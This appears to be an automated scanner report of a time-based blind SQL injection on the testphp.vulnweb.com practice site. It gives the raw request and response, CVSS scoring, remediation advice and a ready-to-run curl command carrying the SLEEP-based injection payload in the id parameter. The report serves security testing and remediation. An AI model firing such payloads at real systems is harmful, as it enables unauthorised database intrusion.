### Time-Based Blind SQL Injection (time-based-sqli-fuzzing-a5ebca2164701f3742156c47c46d78c248776ac736d1e1942176fa598e4d6e5f) found on testphp.vulnweb.com

----
**Details**: **time-based-sqli-fuzzing-a5ebca2164701f3742156c47c46d78c248776ac736d1e1942176fa598e4d6e5f** matched at testphp.vulnweb.com

**Protocol**: HTTP

**Full URL**: http://testphp.vulnweb.com/AJAX/infocateg.php?id=if(now()=sysdate(),SLEEP(7),0)

**Timestamp**: Thu Jun 12 23:21:59 +0800 WITA 2025

**Template Information**

| Key | Value |
| --- | --- |
| Name | Time-Based Blind SQL Injection |
| Authors | wahyuhadi |
| Tags | time-based-sqli, sqli, dast, blind |
| Severity | critical |
| Description | Time-Based SQL Injection is a type of Blind SQL Injection attack where an attacker determines database vulnerabilities by sending queries that force the database to delay its response. <br>If the response time changes, the attacker can infer whether the injected SQL query was successfully executed, even though there is no direct output from the database.<br> |
| tech | sql |
| severtity | high (7.5) |
| cvss-3.1 | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| cvss-3.1-link | https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |

**Request**
```http
GET /AJAX/infocateg.php?id=if(now()=sysdate(),SLEEP(7),0) HTTP/1.1
Host: testphp.vulnweb.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Cookie: mycookie=3
Referer: http://testphp.vulnweb.com/AJAX/index.php


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Content-Type: text/xml;charset=UTF-8
Date: Thu, 12 Jun 2025 15:21:59 GMT
Server: nginx/1.19.0
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1

<iteminfo></iteminfo>
```
**Metadata:**

- path: if(now()=sysdate(),SLEEP(7),0)

**Fixing**

- Prepared statements ensure that user input is treated as data, not executable SQL code. This completely prevents SQL injection.
- Stored procedures execute SQL commands safely within the database, reducing the risk of injection when properly implemented.
- Never display database error messages to users.
- Ensure that the database user only has necessary privileges (e.g., no DROP, ALTER, EXECUTE permissions for web users).




**CURL command**
```sh
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.5' -H 'Connection: keep-alive' -H 'Cookie: mycookie=3' -H 'Host: testphp.vulnweb.com' -H 'Referer: http://testphp.vulnweb.com/AJAX/index.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0' 'http://testphp.vulnweb.com/AJAX/infocateg.php?id=if(now()=sysdate(),SLEEP(7),0)'
```


----

Eagle Pulsar Team :  > From Home With Love